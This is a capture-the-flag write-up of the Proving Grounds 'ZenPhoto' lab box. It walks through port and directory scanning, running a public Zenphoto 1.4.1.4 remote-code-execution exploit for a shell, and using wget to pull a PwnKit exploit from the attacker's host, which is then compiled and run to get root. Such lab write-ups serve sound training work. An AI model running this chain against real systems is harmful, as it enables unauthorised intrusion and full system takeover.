---
title: Proving Grounds - ZenPhoto
date: 2022-11-19
author: Marius
tags: [ctf, 'proving grounds', 'pg']
---

Intermediate OSCP like box found in Proving grounds. Lets go!

### Enumeration

```
└─$ rustscan -a 192.168.209.41 -- -sC -sV | tee nmap 

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
23/tcp   open  ipp     syn-ack CUPS 1.4
|_http-title: 403 Forbidden
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.4
80/tcp   open  http    syn-ack Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.14 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp open  mysql   syn-ack MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

First of all I checked port 23 as according to NMAP scan it's running CUPS server which was interesting. But I did not find any foothold so moved to port 80.

Feroxbuster revealed a directory - **test**

```
└─$ feroxbuster --url http://192.168.209.41/ --no-recursion               

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        4l        5w       75c http://192.168.209.41/
200      GET        4l        5w       75c http://192.168.209.41/index
301      GET        9l       28w      315c http://192.168.209.41/test => http://192.168.209.41/test/
```

![alt text](/assets/img/zenphoto/1.png)

Inspector-gadgeting source code revealed that this is zenphoto 1.4.1.4

![alt text](/assets/img/zenphoto/2.png)


Doing a quick search I found an [exploit](https://www.exploit-db.com/exploits/18083) 

### Exploitation

Running previously mentioned exploit I got a shell and a local flag.

```
└─$ php 18083.php 192.168.209.41 /test/

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# whoami
www-data

zenphoto-shell# ls /home
local.txt
```

Getting stable shell.

![alt text](/assets/img/zenphoto/3.png)


### Privilege Escalation

Transferred **linpeas.sh** using SimpleHttpServer and Linux Exploit Suggested quite few exploits.

```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,[ ubuntu=10.04{kernel:2.6.32-21-generic} ],ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Exposure: highly probable
   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},[ ubuntu=10.04{kernel:2.6.32-(21|24)-generic} ]
   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

```

I have attempted Pwnkit exploit as I already had the script on my machine.

```
www-data@offsecsrv:/tmp$ wget 192.168.49.209/pwnkit.c 
wget 192.168.49.209/pwnkit.c
--2022-11-19 18:59:28--  http://192.168.49.209/pwnkit.c
Connecting to 192.168.49.209:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1267 (1.2K) [text/x-csrc]
Saving to: `pwnkit.c'

100%[======================================>] 1,267       --.-K/s   in 0.04s   

2022-11-19 18:59:28 (31.0 KB/s) - `pwnkit.c' saved [1267/1267]

www-data@offsecsrv:/tmp$ gcc pwnkit.c -o pwn
gcc pwnkit.c -o pwn
www-data@offsecsrv:/tmp$ chmod +x pwn
chmod +x pwn
www-data@offsecsrv:/tmp$ ./pwn
./pwn
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
mysqlpass  proof.txt
```

And that's how I got the root.